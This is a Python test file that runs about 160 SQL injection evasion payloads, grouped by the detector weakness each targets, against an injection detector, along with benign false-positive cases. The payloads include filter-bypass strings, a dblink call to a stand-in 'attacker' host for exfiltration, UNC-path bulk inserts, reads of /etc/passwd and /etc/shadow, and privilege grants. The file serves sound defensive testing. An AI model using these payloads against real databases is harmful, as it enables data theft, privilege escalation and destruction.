"""
Round 4 — Novel adversarial bypass attempts (~160 payloads).
Targets specific architectural vulnerabilities identified from internal code
analysis of sql_injection_detector.py v3.1.0.

Vulnerabilities targeted:
  A. Multi-fragment comment split (comment_replacer only merges 2 fragments)
  B. Deep nested comments (5-iteration cap)
  C. No-quote numeric tautology gaps (regex only matches digit=digit, not 2>1)
  D. Double HTML entity encoding (html.unescape runs once only)
  E. RTL/LTR override chars not in zero-width strip regex
  F. Underrepresented SQL dialect keywords (pragma, bulk, openrowset, etc.)
  G. UNION SELECT prose guard bypass (English word in gap)
  H. CNN vs Semantic preprocessing split (HTML entities)
"""
import os, sys, time
os.environ["PYTHONIOENCODING"] = "utf-8"
if sys.platform == "win32":
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")

from sql_injection_detector import SQLInjectionEnsemble
detector = SQLInjectionEnsemble()

# T = should block (injection), F = must NOT block (safe/false-positive)
T, F = True, False

TESTS = {
# ═══════════════════════════════════════════════════════════════════════════════
# 1. MULTI-FRAGMENT COMMENT SPLIT  (Vulnerability A)
#    UN/**/I/**/ON splits into 3 pieces; merger only checks 2-fragment joins,
#    so "UNI" and "ION" are each unrecognized → result is "UN I ON" (spaces).
# ═══════════════════════════════════════════════════════════════════════════════
"1. MULTI-FRAGMENT COMMENT SPLIT": [
    ("UN/**/I/**/ON SE/**/L/**/ECT 1,2,3--",         "3-piece UNION SELECT no quote",         T),
    ("UN/**/I/**/ON SE/**/L/**/ECT NULL--",           "3-piece UNION SELECT NULL no quote",    T),
    ("' UN/**/I/**/ON SE/**/L/**/ECT NULL--",         "quoted 3-piece UNION SELECT",           T),
    ("SE/**/L/**/ECT * FR/**/O/**/M users--",         "3-piece SELECT FROM no quote",          T),
    ("DR/**/O/**/P TA/**/B/**/LE users--",            "3-piece DROP TABLE no quote",           T),
    ("IN/**/S/**/ERT IN/**/T/**/O users VALUES(1)--", "3-piece INSERT INTO",                   T),
    ("UP/**/D/**/ATE users SET pass='x'--",           "3-piece UPDATE SET",                    T),
    ("DE/**/L/**/ETE FR/**/O/**/M users--",           "3-piece DELETE FROM",                   T),
    ("' DR/**/O/**/P TA/**/B/**/LE users--",          "quoted 3-piece DROP TABLE",             T),
    ("EX/**/E/**/C xp_cmdshell('dir')--",             "3-piece EXEC xp_cmdshell",              T),
    ("U/**/N/**/I/**/ON S/**/E/**/LECT 1--",          "4-piece UNION SELECT split",            T),
    ("UN /**/ ION SE /**/ LECT NULL--",               "space-padded comment UNION SELECT",     T),
],

# ═══════════════════════════════════════════════════════════════════════════════
# 2. DEEP NESTED COMMENTS  (Vulnerability B)
#    The normalizer loops max 5 times. 6+ nesting levels may survive partially.
#    After loop, orphan /* and */ stripped but fragments may not merge.
# ═══════════════════════════════════════════════════════════════════════════════
"2. DEEP NESTED COMMENTS": [
    ("SE/*/*/*/*/*/*/LECT * FROM users--",             "6-level nested SELECT FROM",            T),
    ("UN/*/*/*/*/*/*/ION SELECT 1,2--",               "6-level nested UNION",                  T),
    ("' DR/*/*/*/*/*/*/OP TABLE users--",              "6-level quoted DROP TABLE",             T),
    ("SE/*/*/*/*/*/*/*/LECT * FROM users--",           "7-level nested SELECT FROM",            T),
    ("UN/*/*/*/*/*/*/*/ION SELECT NULL--",             "7-level nested UNION",                  T),
    ("UN/*/*/*/ION SE/*/*/*/LECT 1--",                "triple-nested UNION SELECT",            T),
    ("SE/*/*/*/LECT * FR/*/*/*/*/OM users--",          "mixed 3+4 level SELECT FROM",           T),
    ("UN/*x/*y/*z/*/ION SELECT 1--",                  "content-bearing nested comments",       T),
    ("' SE/*a/*b/*/LECT * FROM users--",               "quoted content nested SELECT",          T),
],

# ═══════════════════════════════════════════════════════════════════════════════
# 3. NO-QUOTE NUMERIC TAUTOLOGY VARIANTS  (Vulnerability C)
#    Existing regex: (^|or|and|where|\s)(\d)\s*=\s*\2  (same digit both sides)
#    NOT matched: 2>1, 0<1, 3!=2, 3<>2, 2>=1, 0<=1
# ═══════════════════════════════════════════════════════════════════════════════
"3. NO-QUOTE NUMERIC TAUTOLOGY VARIANTS": [
    ("1 OR 2>1--",                                    "numeric OR greater-than tautology",     T),
    ("1 OR 2>=1--",                                   "numeric OR gte tautology",              T),
    ("1 OR 0<1--",                                    "numeric OR less-than tautology",        T),
    ("1 OR 3<>2--",                                   "numeric OR not-equal <> tautology",     T),
    ("1 OR 3!=2--",                                   "numeric OR bang-not-equal tautology",   T),
    ("-1 OR 2>1--",                                   "negative numeric OR gt tautology",      T),
    ("1 AND 2>1--",                                   "AND greater-than tautology",            T),
    ("1 AND 0<>1--",                                  "AND not-equal numeric",                 T),
    ("1 UNION SELECT 1,2,3",                          "bare numeric UNION no comment",         T),
    ("0 UNION SELECT NULL,NULL",                      "zero prefix UNION no comment",          T),
    ("-1 UNION SELECT 1,2",                           "negative UNION no comment",             T),
    ("1 HAVING 1>0--",                                "HAVING gt tautology numeric",           T),
    ("1 GROUP BY 1 HAVING COUNT(*)>0--",              "GROUP BY HAVING count tautology",       T),
],

# ═══════════════════════════════════════════════════════════════════════════════
# 4. DOUBLE HTML ENTITY ENCODING  (Vulnerability D)
#    html.unescape() runs ONCE. &#x26; = & so &#x26;#x27; → &#x27; (not decoded
#    to apostrophe). Decimal: &#38; = & so &#38;#39; → &#39; (stays encoded).
# ═══════════════════════════════════════════════════════════════════════════════
"4. DOUBLE HTML ENTITY ENCODING": [
    ("&#x26;#x27; OR 1=1--",                          "hex double-encoded quote OR",           T),
    ("&#x26;#x27; UNION SELECT NULL--",               "hex double-encoded quote UNION",        T),
    ("&#x26;#x27; AND SLEEP(5)--",                    "hex double-encoded quote SLEEP",        T),
    ("&#38;#39; OR 1=1--",                            "decimal double-encoded quote OR",       T),
    ("&#38;#39; UNION SELECT 1,2--",                  "decimal double-encoded UNION",          T),
    ("&#x26;amp;#x27; OR 1=1--",                      "triple HTML encoded quote",             T),
    ("%26#x27; OR 1=1--",                             "URL-encoded amp + HTML hex quote",      T),
    ("%26#39; OR 1=1--",                              "URL-encoded amp + HTML decimal quote",  T),
    ("admin&#x26;#x3B; DROP TABLE users--",           "double-encoded semicolon stacked",      T),
    ("admin'&#x26;#x2D;&#x26;#x2D;",                 "double-encoded double-dash comment",    T),
],

# ═══════════════════════════════════════════════════════════════════════════════
# 5. RTL/LTR BIDIRECTIONAL OVERRIDE CHARS  (Vulnerability E)
#    _ZERO_WIDTH_RE misses: U+202E (RTL OVERRIDE), U+202D (LTR OVERRIDE),
#    U+2066-U+2069 (isolates). These survive NFKC and normalization pipeline,
#    and can interrupt \b word boundaries in regex patterns.
# ═══════════════════════════════════════════════════════════════════════════════
"5. RTL/LTR BIDIRECTIONAL OVERRIDE": [
    ("SEL\u202eECT * FROM users--",                   "RTL override mid-SELECT",               T),
    ("UNI\u202eON SELECT 1,2--",                      "RTL override mid-UNION",                T),
    ("' OR\u202e 1=1--",                              "RTL override after OR",                 T),
    ("SEL\u202dECT * FROM users--",                   "LTR override mid-SELECT",               T),
    ("' OR\u202d 1=1--",                              "LTR override after OR",                 T),
    ("SEL\u2066ECT * FROM users--",                   "LTR isolate mid-SELECT",                T),
    ("' \u2066OR\u2069 1=1--",                        "LTR/RTL isolate wrapped OR",            T),
    ("DR\u202eOP TABLE users--",                      "RTL override mid-DROP",                 T),
    ("' OR\u202e '1'='1",                             "RTL override in tautology",             T),
    ("admin'\u202e--",                                "RTL override before comment",           T),
],

# ═══════════════════════════════════════════════════════════════════════════════
# 6. UNDERREPRESENTED SQL DIALECTS  (Vulnerability F)
#    Stacked query regex covers: select|insert|update|delete|drop|truncate|
#    create|alter|exec|shutdown|waitfor|copy
#    MISSING from stacked regex: pragma, bulk, load, reconfigure, openrowset,
#    openquery, grant, revoke. HIGH_RISK includes grant/revoke but not pragma.
# ═══════════════════════════════════════════════════════════════════════════════
"6. UNDERREPRESENTED SQL DIALECTS": [
    # SQLite PRAGMA — not in stacked regex, not in HIGH_RISK_KEYWORDS
    ("'; PRAGMA user_version--",                      "SQLite PRAGMA user_version stacked",    T),
    ("'; PRAGMA table_info(users)--",                 "SQLite PRAGMA table_info stacked",      T),
    ("' UNION SELECT * FROM pragma_table_info('users')--", "SQLite pragma_table_info UNION",   T),
    ("'; PRAGMA database_list--",                     "SQLite PRAGMA database_list stacked",   T),
    # MSSQL OPENROWSET / OPENQUERY — not in any detection list
    ("'; SELECT * FROM OPENROWSET('SQLOLEDB','server=x;uid=sa;pwd=x','SELECT 1')--",
     "MSSQL OPENROWSET injection", T),
    ("'; EXEC sp_addlinkedserver 'attacker'--",       "MSSQL add linked server",               T),
    # MSSQL BULK INSERT and RECONFIGURE — not in stacked regex
    ("'; BULK INSERT users FROM '\\\\attacker\\data.csv'--", "MSSQL BULK INSERT stacked",      T),
    ("'; RECONFIGURE WITH OVERRIDE--",                "MSSQL RECONFIGURE stacked",             T),
    # MySQL LOAD DATA INFILE — not in stacked regex (only INTO OUTFILE is covered)
    ("'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users--", "MySQL LOAD DATA INFILE stacked", T),
    ("'; LOAD DATA LOCAL INFILE '/etc/shadow' INTO TABLE t--", "MySQL LOAD LOCAL stacked",     T),
    # PostgreSQL advanced functions
    ("'; SELECT lo_export(lo_creat(-1),'/tmp/x.php')--", "PG lo_export write file",           T),
    ("'; SELECT dblink('host=attacker','SELECT 1')--", "PG dblink OOB exfil",                  T),
    # GRANT / REVOKE stacked — in HIGH_RISK but NOT in stacked query regex
    ("'; GRANT ALL ON *.* TO 'x'@'%'--",             "MySQL GRANT all stacked",               T),
    ("'; REVOKE ALL PRIVILEGES FROM 'user'@'%'--",    "MySQL REVOKE stacked",                  T),
],

# ═══════════════════════════════════════════════════════════════════════════════
# 7. UNION SELECT PROSE GAP BYPASS  (Vulnerability G)
#    When len(text) > 40 AND the gap between UNION and SELECT contains a word
#    (no digits/parens/*/comma), _gap_is_sql=False → scored as prose, not attack.
# ═══════════════════════════════════════════════════════════════════════════════
"7. UNION SELECT PROSE GAP BYPASS": [
    ("' UNION then SELECT 1,2,3--",                   "UNION 'then' SELECT gap bypass",        T),
    ("' UNION also SELECT NULL--",                    "UNION 'also' SELECT gap bypass",        T),
    ("' UNION here SELECT username FROM users--",      "UNION 'here' SELECT from users",        T),
    ("' UNION now SELECT password FROM users--",       "UNION 'now' SELECT passwords",          T),
    ("' UNION next SELECT @@version--",               "UNION 'next' SELECT version",           T),
    ("' UNION just SELECT table_name FROM information_schema.tables--",
     "UNION 'just' SELECT schema tables", T),
    ("' UNION also SELECT 1,2 FROM users--",           "UNION 'also' SELECT extract",           T),
    ("' UNION or else SELECT NULL FROM dual--",        "UNION 'or else' SELECT dual",           T),
    ("' UNION and then SELECT 1--",                   "UNION 'and then' SELECT gap",           T),
    ("' UNION somehow SELECT user()--",               "UNION 'somehow' SELECT user()",         T),
],

# ═══════════════════════════════════════════════════════════════════════════════
# 8. HTML ENTITY ENCODING (single-encoded)  (Vulnerability H)
#    CNN preprocessor does NOT html.unescape (only URL-decode + comment strip).
#    Full normalizer DOES html.unescape. &#39; = apostrophe.
#    CNN may score lower because &#39; looks like garbage at char level;
#    semantic correctly sees ' after full normalization.
# ═══════════════════════════════════════════════════════════════════════════════
"8. HTML ENTITY ENCODED INJECTION": [
    ("&#39; OR &#39;1&#39;=&#39;1",                   "HTML decimal entity tautology",         T),
    ("&#39; UNION SELECT NULL--",                     "HTML entity quote UNION",               T),
    ("&#39; AND SLEEP(5)--",                          "HTML entity quote time-based",          T),
    ("&#x27; OR &#x27;1&#x27;=&#x27;1",              "HTML hex entity tautology",             T),
    ("&#x27; UNION SELECT 1,2,3--",                   "HTML hex entity UNION",                 T),
    ("' OR &#39;1&#39;=&#39;1--",                     "mixed real+entity tautology",           T),
    ("&#39; OR 1=1--",                                "HTML entity quote OR numeric",          T),
    ("&#39;&#32;OR&#32;1=1--",                        "all-entity encoded injection",          T),
    ("&#x27;&#x20;OR&#x20;1=1--",                     "hex entity fully encoded",              T),
    ("%26%2339%3B OR 1=1--",                          "URL+HTML encoded quote",                T),
],

# ═══════════════════════════════════════════════════════════════════════════════
# 9. STACKED QUERIES WITH NON-STANDARD KEYWORDS  (Vulnerability F ext.)
#    Same gap as category 6, but testing numeric-prefix forms (no quote).
#    Also tests chaining: 1; standard_keyword; missing_keyword.
# ═══════════════════════════════════════════════════════════════════════════════
"9. STACKED NON-STANDARD KEYWORDS": [
    ("1; PRAGMA user_version",                        "numeric stacked PRAGMA no comment",     T),
    ("1; LOAD DATA INFILE '/etc/passwd' INTO TABLE t","numeric stacked LOAD DATA",             T),
    ("1; BULK INSERT t FROM 'x.csv'",                 "numeric stacked BULK INSERT",           T),
    ("1; RECONFIGURE WITH OVERRIDE",                  "numeric stacked RECONFIGURE",           T),
    ("1; GRANT ALL ON *.* TO 'x'@'%'",               "numeric stacked GRANT",                 T),
    ("1; REVOKE ALL ON *.* FROM 'u'@'%'",             "numeric stacked REVOKE",                T),
    ("username=admin; PRAGMA user_version",           "param= stacked PRAGMA",                 T),
    ("id=1; LOAD DATA LOCAL INFILE '/etc/shadow' INTO TABLE t",
     "param= stacked LOAD DATA LOCAL", T),
    ("1; SELECT 1; GRANT ALL ON *.* TO 'x'@'%'",     "chained stacked GRANT",                 T),
    ("1; BULK INSERT t FROM '\\\\attacker\\x.csv'--", "numeric stacked BULK INSERT UNC",       T),
],

# ═══════════════════════════════════════════════════════════════════════════════
# 10. MULTI-LEVEL URL ENCODING CHAINS
#     Normalizer does 3 rounds of URL decode. %2527 = %25 + 27 = %-encoded %.
#     Round1: %2527 → %27 (the % gets decoded from %25)
#     Round2: %27 → ' (apostrophe)
#     Some chained forms may exceed 3 decode rounds or use unusual encoding.
# ═══════════════════════════════════════════════════════════════════════════════
"10. MULTI-LEVEL URL ENCODING CHAINS": [
    ("%2527 OR 1=1--",                                "double URL-encoded quote OR 1=1",       T),
    ("%2527 UNION SELECT NULL--",                     "double URL-encoded quote UNION",        T),
    ("%252527 OR 1=1--",                              "triple URL-encoded quote OR 1=1",       T),
    ("%27%20OR%201%3D1--",                            "fully URL-encoded injection",           T),
    ("%27+OR+1%3D1--",                                "plus-space URL injection",              T),
    ("%27/**/OR/**/1=1--",                            "URL-encoded quote + comments",          T),
    ("%27%09OR%091=1--",                              "tab-space URL-encoded injection",       T),
    ("%EF%BC%87 OR 1=1--",                            "fullwidth quote UTF-8 percent-encoded", T),
    ("%C2%B4 OR 1=1--",                               "acute accent UTF-8 percent-encoded",    T),
    ("%E2%80%99 OR 1=1--",                            "right single quotemark UTF-8 encoded",  T),
],

# ═══════════════════════════════════════════════════════════════════════════════
# 11. ALTERNATIVE WHITESPACE CHARACTERS
#     \s+ in Python matches \t\n\r\f\v and space. NFKC normalizes U+00A0 and
#     some other spaces to regular space. Testing unusual whitespace in
#     SQL keyword separators that might not be normalized.
# ═══════════════════════════════════════════════════════════════════════════════
"11. ALTERNATIVE WHITESPACE INJECTION": [
    ("'\tOR\t1=1--",                                  "tab-separated OR tautology",            T),
    ("'\nOR\n1=1--",                                  "newline-separated OR tautology",        T),
    ("'\rOR\r1=1--",                                  "CR-separated OR tautology",             T),
    ("'\fOR\f1=1--",                                  "form-feed OR tautology",                T),
    ("'\vOR\v1=1--",                                  "vertical-tab OR tautology",             T),
    ("'\u00a0OR\u00a01=1--",                          "non-breaking space OR tautology",       T),
    ("' UNION\u00a0SELECT NULL--",                    "non-breaking space UNION SELECT",       T),
    ("' OR\u2003 1=1--",                              "em-space OR tautology",                 T),
    ("'\u205fOR\u205f1=1--",                          "medium math space OR tautology",        T),
    ("' OR\u3000 1=1--",                              "ideographic space OR tautology",        T),
],

# ═══════════════════════════════════════════════════════════════════════════════
# 12. COMMENT TRUNCATION NOVEL VARIANTS
#     Classic admin'-- is detected. Testing non-standard comment forms and
#     combinations that might evade the comment_strip pattern.
# ═══════════════════════════════════════════════════════════════════════════════
"12. COMMENT TRUNCATION VARIANTS": [
    ("admin'/*",                                      "unclosed block comment truncation",     T),
    ("admin'#;",                                      "hash then semicolon after comment",     T),
    ("admin'\u0023",                                  "Unicode hash U+0023 comment",           T),
    ("'; -- ",                                        "stacked then line comment trailing sp", T),
    ("' ; --",                                        "spaces around semicolon then comment",  T),
    ("admin' ;--",                                    "space before semicolon then comment",   T),
    ("admin'-- -",                                    "double dash space dash",                T),
    ("admin'---",                                     "triple dash comment",                   T),
    ("admin'/*comment*/--",                           "block comment then line comment",       T),
    ("' OR 1=1/*",                                    "OR tautology unclosed comment",         T),
],

# ═══════════════════════════════════════════════════════════════════════════════
# 13. BOOLEAN BLIND WITHOUT QUOTES (numeric context injections)
#     These use SQL functions (SLEEP, BENCHMARK, etc.) in numeric context.
#     No leading quote, relies on function detection in semantic layer.
# ═══════════════════════════════════════════════════════════════════════════════
"13. BOOLEAN/TIME BLIND NO-QUOTE": [
    ("1 OR SLEEP(5)",                                 "numeric OR SLEEP no quote no comment",  T),
    ("1 AND SLEEP(5)--",                              "numeric AND SLEEP with comment",        T),
    ("1 OR BENCHMARK(1000000,MD5(1))--",              "numeric OR BENCHMARK",                  T),
    ("1 AND IF(1>0,SLEEP(5),0)--",                    "numeric AND IF SLEEP",                  T),
    ("1 OR IF(1=1,1,0)=1--",                          "numeric OR IF equals",                  T),
    ("1; WAITFOR DELAY '0:0:5'--",                    "numeric stacked WAITFOR DELAY",         T),
    ("1 OR pg_sleep(5)--",                            "numeric OR pg_sleep",                   T),
    ("1 AND (SELECT COUNT(*) FROM users)>0--",        "numeric AND subquery count",            T),
    ("1 OR (SELECT 1 FROM dual WHERE 1=1)=1--",       "numeric OR Oracle dual subquery",       T),
    ("1 AND SUBSTRING(user(),1,1)='r'--",             "numeric AND substring blind",           T),
],

# ═══════════════════════════════════════════════════════════════════════════════
# 14. SECOND-ORDER / STORED INJECTION SIMULATION
#     Payloads that might pass initial validation but cause harm when stored
#     and later used in a query context. Also tests escaped-quote injection.
# ═══════════════════════════════════════════════════════════════════════════════
"14. SECOND-ORDER STORED INJECTION": [
    ("O'Brien'; DROP TABLE users--",                  "name prefix + DROP TABLE",              T),
    ("test\\'; DROP TABLE users--",                   "backslash-escaped quote stacked DROP",  T),
    ("\\'; INSERT INTO admins VALUES('hacker','x')--","escaped quote INSERT admin",            T),
    ("Robert'); DELETE FROM users--",                 "name paren close DELETE",               T),
    ("user' || (SELECT password FROM users LIMIT 1) || '", "Oracle concat exfil stored",      T),
    ("'; UPDATE users SET role='admin' WHERE '1'='1", "stacked UPDATE role to admin",         T),
    ("test%27%3B DROP TABLE users--",                 "URL-encoded stored injection",          T),
    ("' /*!50000UNION*/ SELECT NULL--",               "MySQL conditional UNION stored",        T),
],

# ═══════════════════════════════════════════════════════════════════════════════
# 15. FALSE POSITIVES — ADVANCED  (must NOT block)
#     Safe inputs that visually or structurally resemble patterns from above.
#     These test that fixes for categories 1-14 don't over-block.
# ═══════════════════════════════════════════════════════════════════════════════
"15. FALSE POSITIVES ADVANCED": [
    # Prose with dispersed SQL keywords
    ("To select items from a union of tables you first drop to the where clause",
     "SQL education prose all keywords", F),
    ("The benchmark shows that selecting from large union tables drops performance",
     "benchmark union select drop prose", F),
    # Numeric comparisons in natural language
    ("The answer is 1=1 as this is a tautology in Boolean algebra",
     "1=1 in educational text", F),
    ("Version 2>1 is the newer release with improved features",
     "greater-than version comparison prose", F),
    ("A != B means they are different values in programming",
     "not-equal in programming prose", F),
    ("2>1 is a true mathematical statement about positive integers",
     "simple inequality in math text", F),
    # Legitimate uses of SQL-adjacent words
    ("The EU (European Union) chose to select new trade representatives",
     "EU select prose legitimate", F),
    ("Use UNION in set theory to combine sets A and B together",
     "union in mathematics context", F),
    ("pragma: no-cache, no-store, must-revalidate",
     "HTTP pragma header legitimate", F),
    # Comment-like structures in natural text
    ("/* This is a C-style comment in code documentation */",
     "C block comment in docs", F),
    ("See section -- 3.2 for more details on this topic",
     "double-dash in section reference", F),
    ("The --dry-run flag shows what would happen without making changes",
     "CLI flag double-dash", F),
    ("The --verbose flag enables detailed output logging mode",
     "verbose CLI flag double-dash", F),
    # Names and quotes near SQL words
    ("D'Souza ordered SELECT menu items from L'Orange restaurant",
     "apostrophe names near SQL words", F),
    ("O'Brien's SQL tutorial explains SELECT and UNION operations",
     "SQL tutorial with apostrophe name", F),
    ("She said: \"I'll be back\" and left the building promptly",
     "quoted speech with contraction", F),
    # Unicode chars in legitimate context
    ("\u202eThis text appears reversed visually to the reader",
     "RTL override in natural text no SQL", F),
    ("The circled letter \u24b6 represents option A in the menu",
     "circled letter described in prose", F),
],
}


def run_category(name, payloads):
    passed = failed = 0
    fn_fails = []
    fp_fails = []
    for payload, desc, should_block in payloads:
        try:
            r = detector.detect(payload)
            act = r["action"]
            ok = (act in ("BLOCK", "ALERT")) if should_block else (act not in ("BLOCK", "ALERT"))
            if ok:
                passed += 1
            else:
                failed += 1
                entry = (
                    payload, desc,
                    r["decision"], act,
                    r["score"],
                    r.get("semantic_score", 0),
                    r.get("rule", "?"),
                )
                if should_block:
                    fn_fails.append(entry)
                else:
                    fp_fails.append(entry)
                tag = "MISS" if should_block else "FP  "
                print(
                    f"  !! [{tag}] {desc:52s} | "
                    f"{r['decision']:12s} {act:10s} "
                    f"S={r['score']:.3f} sem={r.get('semantic_score', 0)}"
                )
        except Exception as e:
            failed += 1
            print(f"  !! [ERR ] {desc:52s} | {e}")
    return passed, failed, fn_fails, fp_fails


def main():
    print("=" * 110)
    print("ROUND 4 -- NOVEL ADVERSARIAL BYPASS TEST (~160 payloads, 15 categories)")
    print("=" * 110)

    total_p = total_f = 0
    all_fn = []
    all_fp = []
    cat_results = []

    start = time.time()
    for name, payloads in TESTS.items():
        print(f"\n--- {name} ({len(payloads)} tests) ---")
        p, f, fn, fp = run_category(name, payloads)
        total_p += p
        total_f += f
        all_fn.extend(fn)
        all_fp.extend(fp)
        cat_results.append((name, p, f, len(payloads)))
    elapsed = time.time() - start

    total = total_p + total_f
    print(f"\n{'=' * 110}")
    print(f"RESULTS: {total_p}/{total} passed ({100 * total_p / total:.1f}%) in {elapsed:.1f}s")
    print(f"{'=' * 110}")
    print(f"\nPer-category:")
    for name, p, f, t in cat_results:
        s = "PASS" if f == 0 else "FAIL"
        print(f"  [{s:4s}] {name:52s}  {p}/{t} ({100 * p / t:.0f}%)")

    if all_fn:
        print(f"\n{'=' * 110}")
        print(f"FALSE NEGATIVES ({len(all_fn)}) -- attacks that BYPASSED the detector:")
        print(f"{'=' * 110}")
        for payload, desc, dec, act, score, sem, rule in all_fn:
            print(f"  VULN  {desc:52s} | {dec}/{act} S={score:.3f} sem={sem} rule={rule}")
            print(f"    payload: {repr(payload[:120])}")

    if all_fp:
        print(f"\n{'=' * 110}")
        print(f"FALSE POSITIVES ({len(all_fp)}) -- safe inputs incorrectly BLOCKED:")
        print(f"{'=' * 110}")
        for payload, desc, dec, act, score, sem, rule in all_fp:
            print(f"  FP    {desc:52s} | {dec}/{act} S={score:.3f} sem={sem} rule={rule}")
            print(f"    payload: {repr(payload[:120])}")

    return total_f


if __name__ == "__main__":
    sys.exit(main())
